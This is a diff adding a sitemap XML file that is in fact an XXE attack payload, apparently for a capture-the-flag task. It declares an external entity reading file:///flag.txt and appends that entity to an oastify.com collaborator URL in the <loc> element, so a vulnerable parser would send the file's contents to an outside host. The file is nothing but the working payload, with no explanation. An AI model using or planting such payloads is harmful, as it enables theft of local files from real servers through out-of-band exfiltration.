@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE urlset [
+<!ENTITY test "http://3w08qawnfps20058i36ry912ttzkndb2.oastify.com"> 
+<!ENTITY file SYSTEM "file:///flag.txt">
+]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+<url>
+    <loc>&test;?&file;</loc>
+</url>
+</urlset>
